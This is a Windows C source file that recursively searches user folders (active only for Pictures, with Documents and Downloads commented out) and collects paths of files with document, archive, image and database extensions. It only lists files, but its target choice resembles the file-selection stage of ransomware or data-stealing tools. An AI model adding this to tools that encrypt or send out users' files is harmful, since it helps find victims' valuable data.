#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <stdlib.h>

/* Allowed extensions */
static const char *allowedExtensions[] = {
    ".pdf",".jpg", ".png",".zip", ".rar",".doc", ".docx", ".xls", ".xlsx",".ppt", ".pptx",".sql", ".db"
};

static const int numExtensions = sizeof(allowedExtensions) / sizeof(allowedExtensions[0]);

/* Convert string to lowercase */
static void string_lower(char *str)
{
    for (; *str; ++str) {
        *str = tolower((unsigned char)*str);
    }
        
}

/* Check if file has allowed extension */
static int has_allowed_extension(const char *filename)
{
    char lower_name[MAX_PATH];

    strncpy(lower_name, filename, MAX_PATH);
    lower_name[MAX_PATH - 1] = '\0';

    string_lower(lower_name);

    const char *ext = strrchr(lower_name, '.');
    if (!ext) {
        return 0;
    }

    for (int i = 0; i < numExtensions; i++) {
        if (strcmp(ext, allowedExtensions[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

/* Add a file path to the dynamic array */
static void add_file_path(char ***paths, size_t *count, const char *path)
{
    char *copy = _strdup(path);
    if (!copy) {
        return;
    }

    char **new_array = realloc(*paths, (*count + 1) * sizeof(char *));
    if (!new_array) {
        free(copy);
        return;
    }

    *paths = new_array;
    (*paths)[*count] = copy;
    (*count)++;
}

/* Recursively list files */
static void list_files(const char *path, char ***paths, size_t *count)
{
    char searchPath[MAX_PATH];
    WIN32_FIND_DATAA find_data;
    HANDLE hFind;

    snprintf(searchPath, MAX_PATH, "%s\\*", path);

    hFind = FindFirstFileA(searchPath, &find_data);
    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do {
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0)
            continue;

        char fullPath[MAX_PATH];
        snprintf(fullPath, MAX_PATH, "%s\\%s", path, find_data.cFileName);

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            list_files(fullPath, paths, count);
        } else if (has_allowed_extension(find_data.cFileName)) {
            add_file_path(paths, count, fullPath);
        }

    } while (FindNextFileA(hFind, &find_data));

    FindClose(hFind);
}

char **find_paths(size_t *outCount)
{
    char **paths = NULL;
    size_t count = 0;

    char documentsPath[MAX_PATH];
    char downloadsPath[MAX_PATH];
    char picturesPath[MAX_PATH];

    // if (SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documentsPath) != S_OK)
    //     return NULL;

    // if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, downloadsPath) != S_OK)
    //     return NULL;
    // strncat(downloadsPath, "\\Downloads", MAX_PATH - strlen(downloadsPath) - 1);

    if (SHGetFolderPathA(NULL, CSIDL_MYPICTURES, NULL, 0, picturesPath) != S_OK)
        return NULL;

    // list_files(documentsPath, &paths, &count);
    // list_files(downloadsPath, &paths, &count);
    list_files(picturesPath, &paths, &count);

    *outCount = count;
    return paths;
}
